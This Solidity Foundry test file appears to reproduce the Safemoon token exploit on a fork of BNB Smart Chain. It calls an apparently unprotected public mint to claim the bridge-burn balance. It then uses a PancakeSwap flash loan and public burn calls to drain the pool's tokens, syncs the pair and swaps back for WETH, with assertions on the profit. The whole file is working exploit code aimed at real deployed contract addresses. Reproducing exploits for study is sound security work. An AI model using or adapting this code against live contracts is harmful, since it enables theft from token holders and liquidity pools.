pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function routerTrade() external pure returns (address);
}

interface ISafemoon {
    function uniswapV2Router() external returns (IUniswapV2Router02);

    function uniswapV2Pair() external returns (address);

    function bridgeBurnAddress() external returns (address);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

    function mint(address user, uint256 amount) external;

    function burn(address from, uint256 amount) external;
}

interface ISafeSwapTradeRouter {
    struct Trade {
        uint256 amountIn;
        uint256 amountOut;
        address[] path;
        address payable to;
        uint256 deadline;
    }

    function getSwapFees(uint256 amountIn, address[] memory path) external view returns (uint256 _fees);

    function swapExactTokensForTokensWithFeeAmount(Trade calldata trade) external payable;
}

interface IWETH {
    function approve(address, uint256) external returns (bool);

    function transfer(address, uint256) external returns (bool);

    function balanceOf(address) external view returns (uint256);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeCallee {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function sync() external;
}

contract SafemoonAttackerTest is Test, IPancakeCallee {
    ISafemoon public sfmoon;
    IPancakePair public pancakePair;
    IWETH public weth;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 26_854_757);

        sfmoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);
        pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
        weth = IWETH(sfmoon.uniswapV2Router().WETH());
    }

    function testMint() public {
        vm.rollFork(26_854_757);

        uint256 originalBalance = sfmoon.balanceOf(address(this));
        emit log_named_uint("sfmoon balance before:", originalBalance);
        assertEq(originalBalance, 0);

        sfmoon.mint(address(this), sfmoon.balanceOf(sfmoon.bridgeBurnAddress()));

        uint256 currentBalance = sfmoon.balanceOf(address(this));
        emit log_named_uint("sfmoon balance after:", currentBalance);
        assertEq(currentBalance, 81_804_509_291_616_467_966);
    }

    function testBurn() public {
        vm.rollFork(26_864_889);

        uint256 originalBalance = weth.balanceOf(address(this));
        emit log_named_uint("weth balance before:", originalBalance);
        assertEq(originalBalance, 0);

        pancakePair.swap(1000 ether, 0, address(this), "ggg");

        uint256 currentBalance = weth.balanceOf(address(this));
        emit log_named_uint("weth balance after:", currentBalance);
        assertEq(currentBalance, 27_463_848_254_806_782_408_231);
    }

    function doBurnHack(uint256 amount) public {
        swappingBnbForTokens(amount);
        sfmoon.burn(sfmoon.uniswapV2Pair(), sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000);
        sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));
        IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();
        swappingTokensForBnb(sfmoon.balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pancakePair));
        require(sender == address(this));

        doBurnHack(amount0);
        weth.transfer(msg.sender, (amount0 * 10_030) / 10_000);
    }

    function swappingBnbForTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(sfmoon);

        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(sfmoon.uniswapV2Router().routerTrade());
        weth.approve(address(sfmoon.uniswapV2Router()), tokenAmount);

        uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);
        ISafeSwapTradeRouter.Trade memory trade = ISafeSwapTradeRouter.Trade({
            amountIn: tokenAmount,
            amountOut: 0,
            path: path,
            to: payable(address(this)),
            deadline: block.timestamp
        });
        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(trade);
    }

    function swappingTokensForBnb(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(sfmoon);
        path[1] = address(weth);

        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(sfmoon.uniswapV2Router().routerTrade());
        sfmoon.approve(address(sfmoon.uniswapV2Router()), tokenAmount);

        uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);
        ISafeSwapTradeRouter.Trade memory trade = ISafeSwapTradeRouter.Trade({
            amountIn: tokenAmount,
            amountOut: 0,
            path: path,
            to: payable(address(this)),
            deadline: block.timestamp
        });
        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(trade);
    }
}
